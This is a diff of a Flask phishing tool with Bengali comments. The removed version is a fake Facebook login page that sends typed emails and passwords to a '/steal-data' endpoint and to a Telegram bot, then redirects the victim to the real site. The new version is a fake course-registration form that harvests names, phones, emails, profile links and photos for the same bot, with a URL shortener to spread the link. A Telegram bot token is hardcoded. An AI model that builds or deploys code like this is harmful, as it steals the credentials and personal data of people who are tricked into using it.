@@ -1,202 +1,158 @@
-
 from flask import Flask, render_template_string, request
 import threading
 import requests
+import os
 
 app = Flask(__name__)
 
-
-# ... (other code remains the same) ...
-
-
-# ... (other code remains the same) ...
-
-
-# আপনার টেলিগ্রাম বটের টোকেন এবং চ্যাট আইডি
+# টেলিগ্রাম বটের টোকেন এবং চ্যাট আইডি
 BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
 CHAT_ID = "6904067155"
-
-# HTML টেমপ্লেট (ফর্ম)
+# HTML টেমপ্লেট
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
+    <title>Course Registration</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(to bottom, #f0f2f5, #ffffff);
+            background-color: #f3f4f6;
             margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .login-container {
-            text-align: center;
-            background: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             padding: 20px;
-            width: 90%;
+        }
+        form {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             max-width: 400px;
+            margin: auto;
         }
-
-        .login-container img {
-            width: 50px;
-            margin-bottom: 20px;
-        }
-
-        .login-container h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            color: #1877f2;
-        }
-
-        .login-container p {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-        }
-
-        .login-container a {
-            font-size: 12px;
-            color: #1877f2;
-            text-decoration: none;
-        }
-
-        .login-container input {
+        input, button {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
+            padding: 10px;
+            margin: 10px 0;
             border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
+            border-radius: 5px;
         }
-
-        .login-container button {
-            background-color: #1877f2;
-            color: #fff;
-            font-size: 16px;
-            font-weight: bold;
-            padding: 12px;
+        button {
+            background-color: #4CAF50;
+            color: white;
             border: none;
-            border-radius: 4px;
             cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
         }
-
-        .login-container button:hover {
-            background-color: #145dbf;
-        }
-
-        .login-container .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #aaa;
+        button:hover {
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
-        <p>Facebook requests and receives your phone number from your mobile network.</p>
-        <a href="#">Change Settings</a>
-        <form action="#" method="POST" id="loginForm">
-            <input type="text" name="email" placeholder="Número de telemóvel ou e-mail" required>
-            <input type="password" name="password" placeholder="Palavra-passe" required>
-            <button type="submit">Iniciar sessão</button>
-        </form>
-        <a href="#" style="margin-top: 10px; display: block;">Esqueceste-te da palavra-passe?</a>
-        <button style="background: #e7f3ff; color: #1877f2; margin-top: 20px;">Criar conta nova</button>
-        <div class="footer">© Meta</div>
-    </div>
+    <h1 style="text-align: center;">Course Registration Form</h1>
+    <form method="POST" enctype="multipart/form-data">
+        <label for="name">Name:</label><br>
+        <input type="text" id="name" name="name" required><br><br>
 
-   <script>
-    
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault(); 
+        <label for="phone">Phone Number:</label><br>
+        <input type="text" id="phone" name="phone" required><br><br>
 
-        
-        var email = document.querySelector('input[name="email"]').value;
-        var password = document.querySelector('input[name="password"]').value;
+        <label for="email">Email Address:</label><br>
+        <input type="email" id="email" name="email" required><br><br>
 
-      
-        fetch('http://192.168.1.35:8080/steal-data', { 
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: email,
-                password: password
-            })
-        })
-        .then(response => {
-            
-            window.location.href = 'https://www.facebook.com'; 
-        })
-        .catch(error => {
-            console.error('Erro ao enviar dados:', error);
-        });
-    });
-</script>
+        <label for="facebook_link">Facebook Profile Link:</label><br>
+        <input type="url" id="facebook_link" name="facebook_link" required><br><br>
+
+        <label for="photo">Upload Photo:</label><br>
+        <input type="file" id="photo" name="photo" accept="image/*"><br><br>
+
+        <button type="submit">Submit</button>
+    </form>
 </body>
 </html>
-
 """
-def generate_tinyurl(url):
-    api_url = f"http://tinyurl.com/api-create.php?url={url}"
-    response = requests.get(api_url)
-    if response.status_code == 200:
-        return response.text
-    return None
-    
 
-# টেলিগ্রামে বার্তা পাঠানোর ফাংশন
+def send_message_to_telegram(data, photo_path=None):
+    # ফটো পাঠানোর জন্য বার্তা তৈরি
+    if photo_path:
+        photo_status = "ফটো আপলোড করা হয়েছে।"
+    else:
+        photo_status = "ফটো পাওয়া যায়নি।"
+    
+    # টেক্সট বার্তা তৈরি
+    message = (
+        f"New Course Registration:\n\n"
+        f"Name: {data['name']}\n"
+        f"Phone: {data['phone']}\n"
+        f"Email: {data['email']}\n"
+        f"Facebook Profile: {data['facebook_link']}\n"
+        f"Photo: {photo_status}"
+    )
+
+    # টেলিগ্রামে বার্তা পাঠানো
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": message}
+    requests.post(url, data=payload)
+
+    # ফটো পাঠানো (যদি থাকে)
+    if photo_path:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        with open(photo_path, "rb") as photo:
+            files = {"photo": photo}
+            payload = {"chat_id": CHAT_ID}
+            requests.post(url, data=payload, files=files)
 
 @app.route("/", methods=["GET", "POST"])
 def registration_form():
     if request.method == "POST":
         # Collect form data
         form_data = {
+            "name": request.form.get("name"),
+            "phone": request.form.get("phone"),
             "email": request.form.get("email"),
-            "password": request.form.get("password"),
+            "facebook_link": request.form.get("facebook_link"),
         }
 
+        # Handle photo upload
+        photo = request.files.get("photo")
+        photo_path = None
+        if photo:
+            photo_path = os.path.join("uploads", photo.filename)
+            photo.save(photo_path)
+
         # Send data to Telegram
-        send_message_to_telegram(form_data)
+        send_message_to_telegram(form_data, photo_path)
+
+        # Clean up uploaded photo
+        if photo_path and os.path.exists(photo_path):
+            os.remove(photo_path)
 
         return "<h1>Thank you! Your form has been submitted successfully.</h1>"
 
     return render_template_string(HTML_TEMPLATE)
-def send_message_to_telegram(data):
-    message = (
-        f"New Course Registration:\n\n"
-        f"Email: {data['email']}\n"
-        f"Password: {data['password']}"
-    )
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": message}
-    requests.post(url, data=payload)
-    
+
 def run_server():
     app.run(debug=False, port=5000, use_reloader=False)
 
-# Main function to start Flask and generate TinyURL
 if __name__ == "__main__":
     threading.Thread(target=run_server).start()
 
-    # Generate ngrok URL (replace this part with your actual ngrok command if needed)
-    ngrok_url = "http://127.0.0.1:5000"  # Replace with the actual ngrok URL
-    tiny_url = generate_tinyurl(ngrok_url)
+    # Generate da.gd short URL
+    public_url = "http://127.0.0.1:5000"
+    short_url = generate_short_url(public_url)
 
-    if tiny_url:
-        print(f"Your TinyURL is: {tiny_url}")
+    if short_url:
+        print(f"Your Short URL is: {short_url}")
     else:
-        print("Failed to generate TinyURL. Please try again.")
+        print("Failed to generate short URL. Please try again.")
+
+def generate_short_url(url):
+    api_url = f"https://da.gd/s?url={url}"
+    try:
+        response = requests.get(api_url)
+        if response.status_code == 200:
+            return response.text.strip()  # শর্ট URL ফেরত দেয়
+    except Exception as e:
+        print(f"Error: {e}")
+    return None
